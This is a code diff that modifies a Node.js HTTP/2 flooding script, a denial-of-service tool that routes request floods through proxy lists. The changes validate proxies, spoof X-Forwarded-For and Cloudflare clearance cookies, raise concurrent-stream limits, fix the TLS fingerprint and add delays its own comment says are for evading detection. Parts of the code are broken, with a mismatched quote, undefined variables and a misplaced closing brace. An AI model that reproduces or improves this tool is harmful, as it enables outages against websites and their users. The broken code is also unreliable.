@@ -48,7 +48,7 @@ function randstr(length) {
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
-    Rate: parseInt(process.argv[4]),
+    rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 };
@@ -131,39 +131,41 @@ if (cluster.isMaster) {
 class NetSocket {
     constructor() {}
 
-    HTTP(options, callback) {
-        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
-        const buffer = Buffer.from(payload);
-        const connection = net.connect({
-            host: options.host,
-            port: options.port,
-            noDelay: true
-        });
+    async HTTP(options) {
+        return new Promise((resolve, reject) => {
+            const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
+            const buffer = Buffer.from(payload);
+            const connection = net.connect({
+                host: options.host,
+                port: options.port,
+                noDelay: true
+            });
 
-        connection.setTimeout(options.timeout * 1000);
-        connection.setKeepAlive(true, 60000);
+            connection.setTimeout(options.timeout * 1000);
+            connection.setKeepAlive(true, 60000);
 
-        connection.on("connect", () => {
-            connection.write(buffer);
-        });
+            connection.on("connect", () => {
+                connection.write(buffer);
+            });
 
-        connection.on("data", chunk => {
-            const response = chunk.toString("utf-8");
-            if (!response.includes("HTTP/1.1 200")) {
+            connection.on("data", chunk => {
+                const response = chunk.toString("utf-8");
+                if (!response.includes("HTTP/1.1 200")) {
+                    connection.destroy();
+                    return reject("invalid proxy response");
+                }
+                return resolve(connection);
+            });
+
+            connection.on("timeout", () => {
                 connection.destroy();
-                return callback(undefined, "invalid proxy response");
-            }
-            return callback(connection);
-        });
+                reject("timeout");
+            });
 
-        connection.on("timeout", () => {
-            connection.destroy();
-            callback(undefined, "timeout");
-        });
-
-        connection.on("error", () => {
-            connection.destroy();
-            callback(undefined, "error");
+            connection.on("error", () => {
+                connection.destroy();
+                reject("error");
+            });
         });
     }
 }
@@ -173,14 +175,14 @@ const Socker = new NetSocket();
 function generateDynamicPath() {
     const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
     const queries = [
-        `search=${encodeURIComponent(randstr(6))}`,
+        `q=${encodeURIComponent(randstr(6))}`,
         `id=${randomIntn(1000, 9999)}`,
         `page=${randomIntn(1, 20)}`,
         `token=${randstr(10)}`,
         `lang=${randomElement(['en', 'vi', 'zh', 'fr'])}`,
         `category=${randstr(5)}`
     ];
-    const queryCount = randomIntn(1, 3);
+    const queryCount = randomIntn(1, 4);
     return `${basePath}?${queries.slice(0, queryCount).join('&')}`;
 }
 
@@ -208,89 +210,110 @@ function generateDynamicHeaders() {
         "referer": randomElement(referers),
         "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
         "sec-ch-prefers-color-scheme": randomElement(["light", "dark"]),
-        "sec-ch-viewport-width": randomIntn(800, 1920).toString()
+        "sec-ch-viewport-width": randomIntn(800, 1920).toString(),
+        "cookie": `__cfduid=${randstr(32)}; cf_clearance=${randstr(40)}; session=${randstr(16)}`
     };
-    if (Math.random() > 0.5) {
-        headers["cookie"] = `__cfduid=${randstr(32)}; session=${randstr(16)}`;
-    }
     return headers;
 }
 
-function runFlooder() {
-    const proxyAddr = randomElement(proxies);
-    const parsedProxy = proxyAddr.split(":");
-    if (!parsedProxy[0] || !parsedProxy[1]) return setTimeout(runFlooder, 0);
+async function checkProxy(proxyAddr) {
+    const [host, port] = proxyAddr.split(":");
+    try {
+        const connection = await Socker.HTTP({
+            host,
+            port: parseInt(port),
+            address: parsedTarget.host + ":443",
+            timeout: 2
+        });
+        connection.destroy();
+        return true;
+    } catch {
+        return false;
+    }
+}
+
+async function runFlooder() {
+    let proxyAddr = randomElement(proxies);
+    let parsedProxy = proxyAddr.split(":");
+    while (!(parsedProxy[0] && parsedProxy[1] && await checkProxy(proxyAddr))) {
+        proxyAddr = randomElement(proxies);
+        parsedProxy = proxyAddr.split(":");
+    }
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
-        address: parsedTarget.host + ":443",
-        timeout: 3
+        address: parsedProxyOptions.host + ":443",
+        timeout: 10
     };
 
-    Socker.HTTP(proxyOptions, (connection, error) => {
-        if (error) {
-            if (connection) connection.destroy();
-            return setTimeout(runFlooder, 0);
-        }
-
+    try {
+        const connection = await fetcher.HTTP(proxyOptions);
         const tlsOptions = {
             secure: true,
-            ALPNProtocols: ['h2', 'http/1.1'],
+            ALPNProtocols: ['h2'],
             ciphers: ciphers,
             host: parsedTarget.host,
             servername: parsedTarget.host,
             rejectUnauthorized: false,
-            minVersion: 'TLSv1.2',
+            minVersion: 'TLSv1.3',
             maxVersion: 'TLSv1.3',
-            ecdhCurve: randomElement(['X25519', 'prime256v1', 'secp384r1'])
+            ecdhCurve: 'X25519',
+            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256',
+            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-        tlsConn.setKeepAlive(true, 60000);
+        tlsConn.setKeepAlive(true, 120000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 50,
-                initialWindowSize: 6291456,
-                maxHeaderListSize: 65536
+                maxConcurrentStreams: 200,
+                initialWindowSize: 10485760,
+                maxHeaderListSize: 262144
             },
             createConnection: () => tlsConn
         });
 
-        client.on("connect", () => {
-            const IntervalAttack = setInterval(() => {
+        client.on("connect', () => {
+            const intervalAttack = setInterval(async () => {
                 const dynHeaders = generateDynamicHeaders();
-                for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request(dynHeaders);
+                for (let i = 0; i < args.rate; i++) {
+                    const request = client.request(dynHeaders, { timeout: 500 });
                     request.on("response", () => {
-                        request.close();
-                        request.destroy();
+                        request.close(http2.constants.NGHTTP2_NO_ERROR);
                     });
                     request.on("error", () => {
-                        request.close();
-                        request.destroy();
+                        request.close(http2.constants.NGHTTP2_CANCEL);
                     });
                     request.end();
-                }
-            }, 0);
-            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
+                });
+                // Random delay để tránh detection
+                await new Promise(r => setTimeout(r, randomIntn(50, 150)));
+            }, 1);
+
+            setTimeout(() => {
+                clearInterval(intervalAttack);
+                client.destroy();
+                tlsConn.destroy();
+                connection.destroy();
+            }, args.time * 1000);
         });
 
         client.on("error", () => {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 0);
         });
 
         client.on("close", () => {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 0);
         });
-    });
+    } catch (error) {
+        setTimeout(runFlooder, 1000);
+    }
 }
